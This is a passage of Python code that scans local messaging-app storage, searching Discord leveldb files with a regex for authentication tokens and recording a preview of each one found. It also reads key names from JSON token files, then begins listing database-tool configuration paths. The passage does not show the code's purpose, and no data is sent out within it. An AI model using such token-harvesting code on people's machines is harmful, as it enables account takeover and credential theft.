    ]
    for app_name, token_path in token_locations:
        if os.path.exists(token_path):
            entry = {'app': app_name, 'path': token_path}
            if os.path.isdir(token_path):
                # Search leveldb for tokens
                for ldb_file in glob.glob(os.path.join(token_path, '*.ldb')) + glob.glob(os.path.join(token_path, '*.log')):
                    try:
                        with open(ldb_file, 'r', errors='ignore') as f:
                            content = f.read()
                        # Discord tokens: starts with base64-encoded user ID
                        tokens = re.findall(r'["\']([A-Za-z0-9\-_]{24}\.[A-Za-z0-9\-_]{6}\.[A-Za-z0-9\-_]{27,})["\']', content)
                        if tokens:
                            entry['tokens_found'] = len(tokens)
                            entry['token_preview'] = tokens[0][:20] + '...'
                            break
                    except Exception:
                        pass
            elif os.path.isfile(token_path) and token_path.endswith('.json'):
                try:
                    with open(token_path, 'r') as f:
                        data = json.load(f)
                    entry['keys'] = list(data.keys())
                except Exception:
                    pass
            results['messaging_tokens'].append(entry)

    # ── 6. Database Management Tools ──
    db_tools = [
        ('DBeaver', os.path.join(home, '.local', 'share', 'DBeaverData', 'workspace6', '.metadata', '.plugins',
